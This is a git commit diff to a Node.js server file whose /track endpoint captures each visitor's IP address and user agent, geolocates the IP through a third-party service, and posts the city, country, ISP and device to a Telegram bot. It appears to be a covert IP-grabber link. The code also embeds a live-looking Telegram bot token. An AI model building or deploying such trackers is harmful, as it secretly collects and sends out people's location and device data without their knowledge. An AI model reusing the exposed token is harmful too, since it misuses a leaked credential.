0bb0a1eb19a656695bd63e9ea4ec3573ca01db82
fahriy <44180175+fahriy@users.noreply.github.com>
2026-04-26 00:25:25 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,13 +1,17 @@
 app.get("/track", async (req, res) => {
 
-  const rawIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  const ip = rawIp.split(",")[0].trim();
+  const rawIp =
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-forwarded-for"] ||
+    req.socket.remoteAddress;
+
+  const ip = String(rawIp).split(",")[0].replace("::ffff:", "").trim();
 
   const ua = req.headers["user-agent"];
 
   const geo = await fetch(`https://ipwho.is/${ip}`)
-  .then(r => r.json())
-  .catch(() => ({}));
+    .then(r => r.json())
+    .catch(() => ({}));
 
   const time = new Date().toLocaleString("tr-TR", {
     timeZone: "Europe/Istanbul"
@@ -18,8 +22,8 @@ app.get("/track", async (req, res) => {
 
 🌍 IP: ${ip}
 📍 Şehir: ${geo.city || "-"}
-🌎 Ülke: ${geo.country_name || "-"}
-📡 ISP: ${geo.org || "-"}
+🌎 Ülke: ${geo.country || "-"}
+📡 ISP: ${geo.connection?.isp || "-"}
 
 📱 Cihaz: ${ua}
 
@@ -27,8 +31,8 @@ app.get("/track", async (req, res) => {
 `;
 
   await fetch(`https://api.telegram.org/bot8381262942:AAGb0yeCVcl4-IPL_dAhxm7lOjdE7DEKTaA/sendMessage`, {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: "8706199771",
       text: msg
